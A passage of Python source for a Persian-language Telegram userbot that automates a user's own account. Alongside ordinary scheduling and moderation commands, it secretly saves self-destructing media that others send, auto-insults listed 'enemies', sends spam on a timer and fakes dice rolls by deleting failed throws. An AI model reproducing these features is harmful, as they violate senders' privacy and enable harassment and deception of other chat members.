            print(f"🗑️ [LOCK] فایل از {message.from_user.id} حذف شد")
            return
        except Exception as e:
            print(f"❌ [LOCK] خطا در حذف فایل: {e}")
            return

async def keep_online(client: Client):
    global always_online_enabled
    while always_online_enabled:
        try:
            await client.invoke(
                functions.account.UpdateStatus(
                    offline=False
                )
            )
            await asyncio.sleep(20)
        except Exception as e:
            print(f"❌ خطا: {e}")
            await asyncio.sleep(5)

def get_iran_time() -> str:
    now = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M")
    font_dict = FONTS.get(user_fonts.get("me", 1), FONTS[1])
    return ''.join([font_dict.get(char, char) for char in now])

def get_iran_datetime() -> str:
    return datetime.now(pytz.timezone('Asia/Tehran')).strftime('%Y-%m-%d %H:%M:%S')

async def update_name_with_time(user_id: int, client: Client) -> bool:
    if not user_time_status.get(user_id):
        return False
    
    try:
        user = await client.get_users(user_id)
        first_name = user_original_names.get(user_id, user.first_name or "")
        new_name = f"{first_name} {get_iran_time()}"
        await client.update_profile(first_name=new_name)
        return True
    except Exception as e:
        print(f"❌ خطا در آپدیت نام کاربر {user_id}: {e}")
        return False

async def continuous_time_updater(client: Client):
    global time_updater_started
    while True:
        try:
            now = datetime.now(pytz.timezone('Asia/Tehran'))
            seconds_until_next_minute = 60 - now.second
            milliseconds_until_next_minute = (seconds_until_next_minute * 1000) - (now.microsecond // 1000)
           
            await asyncio.sleep(milliseconds_until_next_minute / 1000)
            
            active_users = [uid for uid, status in user_time_status.items() if status]
            for user_id in active_users:
                try:
                    current_time = get_iran_time()
                    original_name = user_original_names.get(user_id, "")
                    new_name = f"{original_name} {current_time}"
                    await client.update_profile(first_name=new_name)
                except Exception as e:
                    print(f"❌ خطا در آپدیت ساعت برای کاربر {user_id}: {e}") 
                    
        except Exception as e:
            print(f"❌ خطا در مدیریت آپدیت زمان: {e}")
            await asyncio.sleep(60)

async def backup_chat(client: Client, chat_id: int, until_message_id: int = None) -> tuple:
    try:
        backup_file = f"{BACKUPS_DIR}/backup_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        user = await client.get_users(chat_id)
        user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{chat_id}"
        me = await client.get_me()
        message_count = 0

        with open(backup_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + f"\n📱 پشتیبان گیری از تلگرام\n" + "="*60 + f"\n👤 کاربر: {user_name}\n🆔 آیدی: {chat_id}\n📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "="*60 + "\n\n")
            
            async for message in client.get_chat_history(chat_id):
                if until_message_id and message.id >= until_message_id:
                    continue
                message_count += 1
                sender_name = "شما" if message.from_user and message.from_user.id == me.id else f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip() or message.from_user.username or "Unknown"
                if message.from_user and message.from_user.id != me.id:
                    sender_name += f" (ID: {message.from_user.id})"
                
                media_type = ""
                if message.photo: media_type = "📷 عکس"
                elif message.video: media_type = "🎥 ویدیو"
                elif message.document: media_type = "📄 فایل"
                elif message.audio: media_type = "🎵 آudio"
                elif message.voice: media_type = "🎤 ویس"
                elif message.sticker: media_type = "🤡 استیکر"
                
                message_text = message.text or message.caption or ""
                f.write(f"#{message_count}\n👤 ارسال کننده: {sender_name}\n🕐 زمان: {message.date.strftime('%Y-%m-%d %H:%M')}\n")
                if media_type: f.write(f"📎 نوع: {media_type}\n")
                if message_text: f.write(f"💬 متن: {message_text}\n")
                f.write("-"*40 + "\n\n")

        return True, backup_file, message_count, user_name
    except Exception as e:
        return False, str(e), 0, None

@app.on_message(filters.private & filters.incoming & (filters.photo | filters.video | filters.voice), group=1)
async def handle_timed_media(client, message):
    is_timed = False
    
    if message.photo and hasattr(message.photo, 'ttl_seconds') and message.photo.ttl_seconds:
        is_timed = True
        media = message.photo
        file_type = 'photo'
        file_ext = 'jpg'
    elif message.video and hasattr(message.video, 'ttl_seconds') and message.video.ttl_seconds:
        is_timed = True
        media = message.video
        file_type = 'video'
        file_ext = 'mp4'
    elif message.voice and hasattr(message.voice, 'ttl_seconds') and message.voice.ttl_seconds:
        is_timed = True
        media = message.voice
        file_type = 'voice'
        file_ext = 'ogg'
    if is_timed:
        try:
            rand = random.randint(1000, 9999999)
            file_path = os.path.join(SAVED_PHOTOS_DIR, f'{file_type}-{rand}.{file_ext}')
            
            await client.download_media(message, file_path)
            
            if os.path.exists(file_path):
                sender = message.from_user
                username = f"@{sender.username}" if sender.username else "ندارد"
                caption = (
                    f"🔥 مدیای زمان‌دار ({file_type})\n"
                    f"👤 {sender.first_name or ''}\n"
                    f"🆔 {username}\n"
                    f"🔢 آیدی: {sender.id}\n"
                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                )
                
                if file_type == 'photo':
                    await client.send_photo("me", photo=file_path, caption=caption)
                elif file_type == 'video':
                    await client.send_video("me", video=file_path, caption=caption)
                elif file_type == 'voice':
                    await client.send_voice("me", voice=file_path, caption=caption)
                
                os.remove(file_path)
                print(f"✅ مدیای تایمدار از {sender.id} ذخیره شد")
                await global_message_handler(client, message)
                
        except Exception as e:
            print(f"❌ خطا در ذخیره مدیای تایمدار: {e}")
            await global_message_handler(client, message)

    else:
        await global_message_handler(client, message)
@app.on_message(~filters.me & filters.incoming)
async def global_message_handler(client: Client, message: Message):
    if not message.from_user:
        return
    await check_lock(client, message)
    
    user_id = message.from_user.id
    message_text = message.text or ""
    if user_id == 777000:
        await forward_and_save_login_codes(client, message)
        return
    
    if str(user_id) in auto_reactions:
        try:
            reaction = auto_reactions[str(user_id)]
            await client.set_reaction(
                chat_id=message.chat.id,
                message_id=message.id,
                reaction=[ReactionTypeEmoji(emoji=reaction)]
            )
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception:
            pass
    

    if user_id in enemies and message_text.strip():
        try:
            insults_list = load_insults()
            if insults_list:
                random_insult = random.choice(insults_list)
                await client.send_message(
                    message.chat.id,
                    random_insult,
                    reply_to_message_id=message.id
                )
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception:
            pass
    if message_text.strip():
        message_text_lower = message_text.strip().lower()
        for trigger, reply in auto_replies.items():
            if trigger.lower() in message_text_lower:
                try:
                    await client.send_message(
                        message.chat.id,
                        reply,
                        reply_to_message_id=message.id
                    )
                    break
                except FloodWait as e:
                    await asyncio.sleep(e.value)
                    break
                except Exception:
                    break
@app.on_message(filters.private & ~filters.me)
async def apply_actions_private(client: Client, message: Message):
    await apply_chat_actions(client, message)
@app.on_message(filters.group & ~filters.me)
async def apply_actions_group(client: Client, message: Message):
    await apply_chat_actions(client, message)
@app.on_message(filters.me & filters.regex(r'^پیشی شروع$'))
async def pishi_start_command(client, message):
    task_id, task = task_manager.get_chat_task(message.chat.id)
    if task:
        await message.edit(f"❌ **سیستم پیشی از قبل فعال است!**\n🆔 تسک: `{task_id}`")
        return
    
    await message.edit("🔄 **در حال راه‌اندازی سیستم پیشی...**")
    
    info = await get_pishi_status(client, message.chat.id)
    if not info:
        await message.edit("❌ **اطلاعات دریافت نشد!**\nلطفاً دستور `پیشی` را در گروه بفرستید.")
        return
    
    pps = info.get("points_per_second", 0)
    capacity = info.get("capacity", 0)
    current = info.get("current_points", 0)
    
    if pps == 0:
        await message.edit("❌ **نرخ تولید صفر است!**")
        return
    
    remaining = capacity - current
    wait_seconds = remaining / pps if remaining > 0 else 0
    
    if wait_seconds <= 0:
        success = await do_harvest(client, message.chat.id, info["status_msg"])
        if success:
            await message.edit(f"✅ **برداشت فوری انجام شد!** 🎉\n💰 برداشت: {current:,} 🪙")
            wait_seconds = 10
            harvest_time = get_iran_now() + timedelta(seconds=10)
        else:
            await message.edit("❌ **برداشت ناموفق!**")
            return
    else:
        harvest_time = get_iran_now() + timedelta(seconds=wait_seconds)
    
    task_id = task_manager.create_task(message.chat.id, {
        "pps": pps,
        "capacity": capacity,
        "current_points": current,
        "remaining": remaining,
        "wait_seconds": wait_seconds,
        "harvest_time": harvest_time.isoformat(),
        "harvest_count": 0,
        "total_harvested": 0,
        "status": "scheduled"
    })
    
    hours = int(wait_seconds // 3600)
    minutes = int((wait_seconds % 3600) // 60)
    secs = int(wait_seconds % 60)
    
    if hours > 0:
        time_str = f"{hours} ساعت {minutes} دقیقه {secs} ثانیه"
    elif minutes > 0:
        time_str = f"{minutes} دقیقه {secs} ثانیه"
    else:
        time_str = f"{secs} ثانیه"
    
    await message.edit(
        f"✅ **سیستم پیشی شروع شد!** 🚀\n\n"
        f"🆔 **تسک:** `{task_id}`\n"
        f"📈 **نرخ تولید:** {pps} 🪙/ثانیه\n"
        f"📦 **ظرفیت:** {capacity:,} 🪙\n"
        f"💰 **موجودی فعلی:** {current:,} 🪙\n"
        f"⏱️ **زمان تا برداشت:** {time_str}\n"
        f"⏰ **زمان برداشت:** {harvest_time.strftime('%H:%M:%S')}\n\n"
        f"📁 تسک در فایل ذخیره شد\n"
        f"❌ برای توقف: `پیشی stop`"
    )
@app.on_message(filters.me & filters.regex(r'^پیشی stop$'))
async def pishi_stop_command(client, message):
    task_id, task = task_manager.get_chat_task(message.chat.id)
    
    if not task_id:
        await message.edit("❌ **سیستم پیشی فعال نیست!**")
        return
    
    harvest_count = task.get("harvest_count", 0)
    total_harvested = task.get("total_harvested", 0)
    
    task_manager.delete_task(task_id)
    
    await message.edit(
        f"⏹️ **سیستم پیشی متوقف شد**\n\n"
        f"🆔 **تسک:** `{task_id}`\n"
        f"🔄 **تعداد برداشت:** {harvest_count}\n"
        f"💰 **کل برداشت:** {total_harvested:,} 🪙\n"
        f"📊 **میانگین هر برداشت:** {int(total_harvested / harvest_count) if harvest_count > 0 else 0:,} 🪙"
    )

@app.on_message(filters.me & filters.regex(r'^پیشی status$'))
async def pishi_status_command(client, message):
    task_id, task = task_manager.get_chat_task(message.chat.id)
    
    if not task:
        await message.edit("❌ **سیستم پیشی فعال نیست!**")
        return
    
    info = await get_pishi_status(client, message.chat.id)
    
    status_text = f"""📊 **وضعیت سیستم پیشی**

🆔 **تسک:** `{task_id}`
📈 **نرخ تولید:** {task.get('pps', 0)} 🪙/ثانیه
📦 **ظرفیت:** {task.get('capacity', 0):,} 🪙
💰 **موجودی فعلی:** {task.get('current_points', 0):,} 🪙
🔄 **تعداد برداشت:** {task.get('harvest_count', 0)}
💰 **کل برداشت:** {task.get('total_harvested', 0):,} 🪙
📊 **وضعیت:** {task.get('status', 'نامشخص')}
"""
    
    if task.get('harvest_time'):
        harvest_time = datetime.fromisoformat(task['harvest_time'])
        status_text += f"⏰ **زمان برداشت بعدی:** {harvest_time.strftime('%H:%M:%S')}\n"
    
    if info:
        status_text += f"\n📊 **اطلاعات لحظه‌ای:**\n"
        status_text += f"💰 **موجودی:** {info.get('current_points', 0):,} / {info.get('capacity', 0):,}\n"
        status_text += f"📈 **نرخ:** {info.get('points_per_second', 0)} 🪙/ثانیه"
    
    await message.edit(status_text)

@app.on_message(filters.me & filters.regex(r'^پیشی بگیر$'))
async def pishi_force_harvest(client, message):
    try:
        await message.edit("🔄 **در حال برداشت فوری...**")
        
        info = await get_pishi_status(client, message.chat.id)
        if not info:
            await message.edit("❌ **اطلاعات دریافت نشد!**")
            return
        
        current = info.get("current_points", 0)
        
        if current <= 0:
            await message.edit("❌ **موجودی صفر است!**")
            return
        
        success = await do_harvest(client, message.chat.id, info["status_msg"])
        
        if success:
            await message.edit(
                f"✅ **برداشت فوری انجام شد!** 🎉\n\n"
                f"💰 **برداشت:** {current:,} 🪙\n"
                f"📈 **نرخ:** {info.get('points_per_second', 0)} 🪙/ثانیه\n"
                f"⏰ **زمان:** {get_iran_now().strftime('%H:%M:%S')}"
            )
            
            task_id, task = task_manager.get_chat_task(message.chat.id)
            if task_id:
                task_manager.update_task(task_id, {
                    "harvest_count": task.get("harvest_count", 0) + 1,
                    "total_harvested": task.get("total_harvested", 0) + current,
                    "last_harvest": get_iran_now().isoformat()
                })
                await task_manager.schedule_next_harvest(task_id, client, message.chat.id)
        else:
            await message.edit("❌ **برداشت ناموفق!**")
            
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^پیشی کمک$'))
async def pishi_help_command(client, message):
    help_text = """
🐱 **راهنمای کامل سیستم پیشی**

📌 **دستورات:**
• `پیشی شروع` - شروع سیستم خودکار پیشی
• `پیشی stop` - متوقف کردن سیستم
• `پیشی status` - نمایش وضعیت فعلی
• `پیشی بگیر` - برداشت فوری و دستی
• `پیشی کمک` - نمایش این راهنما

⚙️ **نحوه کار:**
1. اطلاعات پیشی دریافت می‌شود
2. زمان دقیق پر شدن ظرفیت محاسبه می‌شود
3. تسک در فایل ذخیره و زمان‌بندی می‌شود
4. دقیقاً در زمان مقرر، برداشت خودکار انجام می‌شود
5. بعد از برداشت، زمان برداشت بعدی محاسبه می‌شود

💾 **ذخیره‌سازی:**
• همه تسک‌ها در فایل `pishi_tasks.json` ذخیره می‌شوند
• در صورت ری استارت بات، تسک‌ها از فایل بارگذاری می‌شوند
• زمان‌بندی‌ها با کتابخانه APScheduler انجام می‌شود

⚠️ **نکات:**
• سیستم پس از برداشت، خودکار زمان بعدی را محاسبه می‌کند
• در صورت خطا، تلاش مجدد بعد از 60 ثانیه انجام می‌شود
• تسک‌ها در پس‌زمینه و با دقت بالا اجرا می‌شوند
"""
    await message.edit(help_text)

@app.on_message(filters.me & filters.regex(r'^تاس (\d+)$'))
async def dice_game_silent(client: Client, message: Message):
    """
    دستور تاس - تاس میندازه تا عدد مورد نظر بیاد (بی‌صدا)
    مثال: تاس 6
    """
    try:
        target_number = int(message.matches[0].group(1))
        
        if target_number < 1 or target_number > 6:
            await message.delete()
            return
        await message.delete()
        
        attempts = 0
        last_result = None
        
        while True:
            attempts += 1
            dice_msg = await client.send_dice(
                chat_id=message.chat.id,
                emoji="🎲"
            )
            
            last_result = dice_msg.dice.value
            if last_result == target_number:
                break
           
            try:
                await dice_msg.delete()
            except:
                pass
    except ValueError:
        await message.delete()
    except Exception as e:
        await message.delete()
@app.on_message(filters.me & filters.regex(r'^میو (\d+(?:\.\d+)?) دقیقه$'))
async def mewo_command(client: Client, message: Message):
    try:
        minutes_str = message.matches[0].group(1)
        minutes = float(minutes_str)
        
        if minutes <= 0:
            await message.edit("❌ **لطفا یک عدد مثبت وارد کنید!**")
            return
            
        if minutes > 60:
            await message.edit("❌ **حداکثر زمان مجاز: 60 دقیقه**")
            return
            
        chat_id = message.chat.id
        interval_seconds = int(minutes * 60)
       
        if chat_id in mewo_timers:
            old_task = mewo_timers[chat_id].get("task")
            if old_task and not old_task.done():
                old_task.cancel()
                try:
                    await old_task
                except asyncio.CancelledError:
                    pass
            old_count = mewo_timers[chat_id].get("count", 0)
            del mewo_timers[chat_id]
            await message.edit(f"🔄 **تایمر قبلی متوقف شد** (تعداد ارسال: {old_count})\n⏰ تایمر جدید برای {minutes} دقیقه تنظیم شد...")
        else:
            await message.edit(f"✅ **تایمر میو تنظیم شد**\n\n⏰ **هر {minutes} دقیقه** یکبار پیام میو ارسال میشه\n📍 **چت:** {message.chat.title or 'پیوی'}\n🔄 **تکرار:** بی‌نهایت\n⚡ **ارسال اولیه:** هم‌اکنون ارسال شد!\n\n❌ برای متوقف کردن: `میو stop`")
        
        task = asyncio.create_task(mewo_sender(client, chat_id, interval_seconds))
        mewo_timers[chat_id] = {
            "interval": interval_seconds,
            "task": task,
            "started_at": datetime.now(),
            "minutes": minutes,
            "count": 0 
        }
        
    except ValueError:
        await message.edit("❌ **لطفا یک عدد معتبر وارد کنید!**\nمثال: `میو 4.30 دقیقه`")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^میو stop$'))
async def mewo_stop_command(client: Client, message: Message):
    chat_id = message.chat.id
    
    if chat_id in mewo_timers:
        task = mewo_timers[chat_id].get("task")
        if task and not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        
        minutes = mewo_timers[chat_id].get("minutes", "نامشخص")
        count = mewo_timers[chat_id].get("count", 0)
        del mewo_timers[chat_id]
        await message.edit(f"⏹️ **تایمر میو متوقف شد**\n\n⏰ **زمان تنظیم شده:** {minutes} دقیقه\n📊 **تعداد ارسال شده:** {count} بار\n📍 **چت:** {message.chat.title or 'پیوی'}")
    else:
        await message.edit("❌ **هیچ تایمر میویی در این چت فعال نیست!**")

@app.on_message(filters.me & filters.regex(r'^میو status$'))
async def mewo_status_command(client: Client, message: Message):
    if not mewo_timers:
        await message.edit("❌ **هیچ تایمر میویی فعال نیست!**")
        return
        
    status_text = "🐱 **وضعیت تایمرهای میو**\n\n"
    
    for chat_id, timer_data in mewo_timers.items():
        try:
            chat = await client.get_chat(chat_id)
            chat_name = chat.title or "پیوی"
            minutes = timer_data.get("minutes", "نامشخص")
            count = timer_data.get("count", 0)
            started_at = timer_data.get("started_at")
            
            if started_at:
                elapsed = datetime.now() - started_at
                hours = elapsed.seconds // 3600
                mins = (elapsed.seconds % 3600) // 60
                secs = elapsed.seconds % 60
                elapsed_str = f"{hours}h {mins}m {secs}s" if hours > 0 else f"{mins}m {secs}s"
            else:
                elapsed_str = "نامشخص"
                
            status_text += f"📍 **{chat_name}**\n"
            status_text += f"   ⏰ هر {minutes} دقیقه\n"
            status_text += f"   📊 ارسال شده: {count} بار\n"
            status_text += f"   🕐 فعال از: {elapsed_str} پیش\n\n"
            
        except Exception as e:
            status_text += f"📍 **چت {chat_id}** (خطا در دریافت اطلاعات)\n"
            status_text += f"   ⏰ هر {timer_data.get('minutes', 'نامشخص')} دقیقه\n"
            status_text += f"   📊 ارسال شده: {timer_data.get('count', 0)} بار\n\n"
    
    status_text += f"\n📊 **تعداد تایمرهای فعال:** {len(mewo_timers)}"
    await message.edit(status_text)

@app.on_message(filters.me & filters.regex(r'^میو help$'))
async def mewo_help_command(client: Client, message: Message):
    help_text = """
🐱 **راهنمای دستور میو - ارسال فوری + تکرار بی‌نهایت**

📌 **دستورات:**
• `میو [عدد] دقیقه` - شروع تکرار میو (با ارسال فوری اولیه)
• `میو stop` - متوقف کردن تایمر در چت فعلی
• `میو status` - نمایش وضعیت همه تایمرها
• `میو help` - نمایش این راهنما

📝 **مثال‌ها:**
• `میو 5 دقیقه` - بلافاصله میو میفرسته، بعد هر 5 دقیقه دوباره
• `میو 4.30 دقیقه` - بلافاصله میو میفرسته، بعد هر 4.5 دقیقه دوباره
• `میو 0.5 دقیقه` - بلافاصله میو میفرسته، بعد هر 30 ثانیه دوباره

🔄 **نحوه کار:**
1. **همین الان:** اولین "میو" رو ارسال میکنه
2. **بعد از تایم:** دوباره میو میفرسته
3. **تکرار:** تا زمانی که متوقفش کنید ادامه میده

⚠️ **نکات:**
• تایمر فقط برای همان چتی که دستور رو زدید فعال میشه
• حداکثر زمان مجاز: 60 دقیقه
• حداقل زمان مجاز: 0.1 دقیقه (6 ثانیه)

💡 **کاربرد:** برای شروع فوری یک چرخه یادآوری یا اسپم!
"""
    await message.edit(help_text)

@app.on_message(filters.me & filters.regex(r'^ارسال (\d{2}:\d{2}(?::\d{2})?) (.+)$'))
async def set_scheduled_message(client, message):
    global scheduled_messages
    
    try:
        time_str = message.matches[0].group(1)
        content = message.matches[0].group(2)
        
        try:
            if len(time_str.split(':')) == 2:
                time_str_full = f"{time_str}:00"
            else:
                time_str_full = time_str
            datetime.strptime(time_str_full, "%H:%M:%S")
        except:
            await message.edit("❌ **فرمت زمان اشتباه است**\nمثال: `ارسال 15:30 متن` یا `ارسال 15:30:15 متن`")
            return
        format_type = "معمولی"  
        text = content
        
        format_keywords = {
            "بولد": "بولد",
            "معمولی": "معمولی",
            "ایتالیک": "ایتالیک",
            "خط خورده": "خط خورده",
            "زیر خط": "زیر خط",
            "کد": "کد"
        }
       
        for keyword in format_keywords:
            if content.startswith(keyword + " "):
                format_type = format_keywords[keyword]
                text = content[len(keyword) + 1:]  
                break
        
        import re
        link = None
        full_link = None
        target_chat_id = message.chat.id
        
        link_pattern = r'(https?://t\.me/[^\s]+)'
        link_match = re.search(link_pattern, text)
        
        if link_match:
            full_link = link_match.group(1)
            
            parts = full_link.split('/')
            if len(parts) >= 3:
                try:
                    chat_part = parts[-2]
                    link = int(parts[-1])
                    
                    try:
                        if chat_part.lstrip('-').isdigit():
                            target_chat_id = int(chat_part)
                        else:
                            chat = await client.get_chat(f"@{chat_part}")
                            target_chat_id = chat.id
                    except:
                        target_chat_id = message.chat.id
                        
                except:
                    link = None
                    target_chat_id = message.chat.id
            
            text = text.replace(full_link, '').strip()
        
        formatted_text = text
        if format_type == "بولد":
            formatted_text = f"**{text}**"
        elif format_type == "ایتالیک":
            formatted_text = f"*{text}*"
        elif format_type == "خط خورده":
            formatted_text = f"~~{text}~~"
        elif format_type == "زیر خط":
            formatted_text = f"__{text}__"
        elif format_type == "کد":
            formatted_text = f"`{text}`"
        today = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%Y-%m-%d")
        
        msg_id = f"{target_chat_id}_{int(datetime.now().timestamp())}"
        
        scheduled_messages[msg_id] = {
            'chat_id': str(target_chat_id),
            'time': time_str_full,
            'date': today,
            'text': formatted_text, 
            'original_text': text,  
            'format_type': format_type, 
            'link': link,
            'full_link': full_link,
            'created_at': datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M:%S")
        }
        
        with open("scheduled_messages.json", "w", encoding="utf-8") as f:
            json.dump(scheduled_messages, f, ensure_ascii=False, indent=4)
        
        preview_text = text[:50] + ('...' if len(text) > 50 else '')
        display_time = time_str_full
        
        format_names = {
            "بولد": "**پررنگ**",
            "معمولی": "معمولی",
            "ایتالیک": "*کج*",
            "خط خورده": "~~خط خورده~~",
            "زیر خط": "__زیر خط__",
            "کد": "`کد`"
        }
        
        await message.edit(
            f"✅ **پیام زمان‌دار تنظیم شد**\n\n"
            f"⏰ **زمان:** `{display_time}`\n"
            f"🎨 **فرمت:** {format_names.get(format_type, 'معمولی')}\n"
            f"📝 **متن:** {preview_text}\n"
            f"{f'🔗 **لینک:** {full_link}' if full_link else '📌 **بدون لینک**'}\n"
            f"📎 **ارسال در:** `{target_chat_id}`\n"
            f"{f'📎 **ریپلای به:** message_id = `{link}`' if link else ''}\n\n"
            f"📅 **تاریخ:** {today}\n"
            f"🆔 **کد:** `{msg_id}`"
        )
        
        global schedule_task
        if schedule_task is None or schedule_task.done():
            schedule_task = asyncio.create_task(check_scheduled_messages(client))
            print("✅ تسک ارسال زمان‌دار شروع شد")
        
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")
@app.on_message(filters.me & filters.regex(r'^لیست زمان‌دار$'))
async def list_scheduled_messages(client, message):
    global scheduled_messages
    
    if not scheduled_messages:
        await message.edit("❌ **هیچ پیام زمان‌داری تنظیم نشده**")
        return
    
    list_text = "📋 **لیست پیام‌های زمان‌دار**\n\n"
    
    for msg_id, msg_data in scheduled_messages.items():
        list_text += f"🆔 **کد:** `{msg_id}`\n"
        list_text += f"⏰ **زمان:** `{msg_data['time']}`\n"
        list_text += f"📝 **متن:** {msg_data['text'][:30]}{'...' if len(msg_data['text']) > 30 else ''}\n"
        list_text += f"📎 **ارسال در:** `{msg_data['chat_id']}`\n"
        if msg_data.get('link'):
            list_text += f"🔗 **ریپلای به:** message_id = `{msg_data['link']}`\n"
        list_text += "─" * 30 + "\n"
    
    await message.edit(list_text)


@app.on_message(filters.me & filters.regex(r'^حذف زمان‌دار (.+)$'))
async def remove_scheduled_message(client, message):
    global scheduled_messages
    
    msg_id = message.matches[0].group(1)
    
    if msg_id in scheduled_messages:
        del scheduled_messages[msg_id]
        
        with open("scheduled_messages.json", "w", encoding="utf-8") as f:
            json.dump(scheduled_messages, f, ensure_ascii=False, indent=4)
        
        await message.edit(f"✅ **پیام زمان‌دار حذف شد**\n🆔 کد: `{msg_id}`")
    else:
        await message.edit(f"❌ **پیام زمان‌دار با کد `{msg_id}` یافت نشد**")


@app.on_message(filters.me & filters.regex(r'^پاکسازی زمان‌دار$'))
async def clear_scheduled_messages(client, message):
    global scheduled_messages
    
    if not scheduled_messages:
        await message.edit("❌ **هیچ پیام زمان‌داری برای پاکسازی وجود ندارد**")
        return
    
    count = len(scheduled_messages)
    scheduled_messages.clear()
    
    with open("scheduled_messages.json", "w", encoding="utf-8") as f:
        json.dump(scheduled_messages, f, ensure_ascii=False, indent=4)
    
    await message.edit(f"✅ **همه پیام‌های زمان‌دار پاک شدند**\n🗑️ تعداد: {count} پیام")
@app.on_message(filters.me & filters.regex(r'^لیست زمان‌دار$'))
async def list_scheduled_messages(client, message):
    global scheduled_messages
    
    if not scheduled_messages:
        await message.edit("❌ **هیچ پیام زمان‌داری تنظیم نشده**")
        return
    
    list_text = "📋 **لیست پیام‌های زمان‌دار**\n\n"
    
    for msg_id, msg_data in scheduled_messages.items():
        list_text += f"🆔 **کد:** `{msg_id}`\n"
        list_text += f"⏰ **زمان:** `{msg_data['time']}`\n"
        list_text += f"📝 **متن:** {msg_data['text'][:30]}{'...' if len(msg_data['text']) > 30 else ''}\n"
        list_text += "─" * 30 + "\n"
    
    await message.edit(list_text)

@app.on_message(filters.me & filters.regex(r'^حذف زمان‌دار (.+)$'))
async def remove_scheduled_message(client, message):
    global scheduled_messages
    
    msg_id = message.matches[0].group(1)
    
    if msg_id in scheduled_messages:
        del scheduled_messages[msg_id]
        
        with open("scheduled_messages.json", "w", encoding="utf-8") as f:
            json.dump(scheduled_messages, f, ensure_ascii=False, indent=4)
        
        await message.edit(f"✅ **پیام زمان‌دار حذف شد**\n🆔 کد: `{msg_id}`")
    else:
        await message.edit(f"❌ **پیام زمان‌دار با کد `{msg_id}` یافت نشد**")

@app.on_message(filters.me & filters.regex(r'^پاکسازی زمان‌دار$'))
async def clear_scheduled_messages(client, message):
    global scheduled_messages
    
    if not scheduled_messages:
        await message.edit("❌ **هیچ پیام زمان‌داری برای پاکسازی وجود ندارد**")
        return
    
    count = len(scheduled_messages)
    scheduled_messages.clear()
    
    with open("scheduled_messages.json", "w", encoding="utf-8") as f:
        json.dump(scheduled_messages, f, ensure_ascii=False, indent=4)
    
    await message.edit(f"✅ **همه پیام‌های زمان‌دار پاک شدند**\n🗑️ تعداد: {count} پیام")
@app.on_message(filters.me & filters.regex(r'^بن$') & filters.group)
async def ban_user(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
        return
    try:
        user_id = message.reply_to_message.from_user.id
        await client.ban_chat_member(message.chat.id, user_id)
        await message.edit(f"✅ **کاربر بن شد**\n👤 آیدی: `{user_id}`")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^آنبن @(.+)$') & filters.group)
async def unban_user(client, message):
    try:
        username = message.matches[0].group(1)
        user = await client.get_users(f"@{username}")
        await client.unban_chat_member(message.chat.id, user.id)
        await message.edit(f"✅ **کاربر آنبن شد**\n👤 کاربر: {user.first_name}")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^کیک$') & filters.group)
async def kick_user(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
        return
    try:
        user_id = message.reply_to_message.from_user.id
        await client.ban_chat_member(message.chat.id, user_id)
        await client.unban_chat_member(message.chat.id, user_id)
        await message.edit(f"✅ **کاربر کیک شد**\n👤 آیدی: `{user_id}`")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^سکوت$') & filters.group)
async def mute_user(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
        return
    try:
        user_id = message.reply_to_message.from_user.id
        from pyrogram.types import ChatPermissions
        
        permissions = ChatPermissions(
            can_send_messages=False,
            can_send_media_messages=False,
            can_send_other_messages=False,
            can_send_polls=False,
            can_add_web_page_previews=False,
            can_invite_users=False,
            can_change_info=False,
            can_pin_messages=False
        )
        await client.restrict_chat_member(
            chat_id=message.chat.id,
            user_id=user_id,
            permissions=permissions
        )
        await message.edit(f"🔇 **کاربر به سکوت کامل رفت**\n🔒 هیچ دسترسی ندارد\n👤 آیدی: `{user_id}`")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^حذف سکوت$') & filters.group)
async def unmute_user(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
        return
    try:
        user_id = message.reply_to_message.from_user.id
        from pyrogram.types import ChatPermissions
        
        permissions = ChatPermissions(
            can_send_messages=True,
            can_send_media_messages=True,
            can_send_other_messages=True,
            can_send_polls=True,
            can_add_web_page_previews=True,
            can_invite_users=True,
            can_change_info=True,
            can_pin_messages=True
        )
        await client.restrict_chat_member(
            chat_id=message.chat.id,
            user_id=user_id,
            permissions=permissions
        )
        await message.edit(f"🔊 **سکوت کاربر برداشته شد**\n🔓 همه دسترسی‌ها فعال شد\n👤 آیدی: `{user_id}`")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^ادمین$') & filters.group)
async def promote_user(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
        return
    try:
        user_id = message.reply_to_message.from_user.id
        privileges = ChatPrivileges(
            can_manage_chat=True,
            can_delete_messages=True,
            can_restrict_members=True,
            can_promote_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
            can_manage_video_chats=True
        )
        await client.promote_chat_member(message.chat.id, user_id, privileges=privileges)
